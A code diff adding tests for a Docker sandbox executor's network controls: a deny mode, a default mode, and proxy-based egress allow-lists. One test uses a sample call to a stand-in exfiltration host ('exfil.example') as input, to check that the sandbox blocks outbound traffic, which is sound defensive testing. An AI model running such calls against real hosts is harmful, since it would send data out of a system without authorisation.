@@ -21,6 +21,18 @@ vi.mock("@/lib/sandbox/stream-exec", () => ({
   streamExec: (...a: unknown[]) => streamExec(...(a as [])),
 }));
 
+// Egress setup is exercised by its own proof; here we assert the executor
+// wires it: internal network name + proxy env on the analysis container.
+const setupEgressNetwork = vi.fn(async (runId: string, _hosts: string[]) => ({
+  networkName: `hermetic-egress-${runId}`,
+  env: { HTTPS_PROXY: "http://gw:3128", HERMETIC_HTTP_PROXY: "http://gw:3128" },
+  teardown: egressTeardown,
+}));
+const egressTeardown = vi.fn(async () => {});
+vi.mock("@/lib/sandbox/egress", () => ({
+  setupEgressNetwork: (...a: unknown[]) => setupEgressNetwork(...(a as [string, string[]])),
+}));
+
 import { executeSandbox } from "@/lib/sandbox/docker-executor";
 import { run, parseExecutionOutput } from "@/lib/sandbox/docker-utils";
 import { resetDaemonMemoryCacheForTests } from "@/lib/sandbox/memory-budget";
@@ -142,5 +154,46 @@ describe("docker executeSandbox", () => {
     const create = createCall();
     const sleepIdx = create.indexOf("sleep");
     expect(create[sleepIdx + 1]).toBe("infinity");
+  });
+
+  it('network "deny" forces --network none even for remote-IO code (MCP M4)', async () => {
+    await executeSandbox("a\n1\n", "import requests\nrequests.get('https://exfil.example/x')", {
+      network: "deny",
+    });
+    const create = createCall();
+    expect(create).toContain("--network");
+    expect(create[create.indexOf("--network") + 1]).toBe("none");
+  });
+
+  it('network "auto" (default) still grants network to remote-IO code', async () => {
+    await executeSandbox("a\n1\n", "duckdb.sql(\"select * from 's3://bucket/x.parquet'\")");
+    const create = createCall();
+    expect(create).not.toContain("--network");
+  });
+
+  it("allowedEgressHosts: joins the internal network with proxy env; teardown runs (MCP egress)", async () => {
+    await executeSandbox("a\n1\n", "duckdb.sql(\"select * from 's3://b/x.parquet'\")", {
+      allowedEgressHosts: ["b.s3.amazonaws.com", "s3.amazonaws.com"],
+    });
+    expect(setupEgressNetwork).toHaveBeenCalledWith(expect.any(String), [
+      "b.s3.amazonaws.com",
+      "s3.amazonaws.com",
+    ]);
+    const create = createCall();
+    const netIdx = create.indexOf("--network");
+    expect(String(create[netIdx + 1])).toMatch(/^hermetic-egress-/);
+    expect(create).toContain("-e");
+    expect(create).toContain("HERMETIC_HTTP_PROXY=http://gw:3128");
+    expect(egressTeardown).toHaveBeenCalled();
+  });
+
+  it("network deny wins over allowedEgressHosts (no egress setup at all)", async () => {
+    await executeSandbox("a\n1\n", "import requests", {
+      network: "deny",
+      allowedEgressHosts: ["x.example.com"],
+    });
+    expect(setupEgressNetwork).not.toHaveBeenCalled();
+    const create = createCall();
+    expect(create[create.indexOf("--network") + 1]).toBe("none");
   });
 });
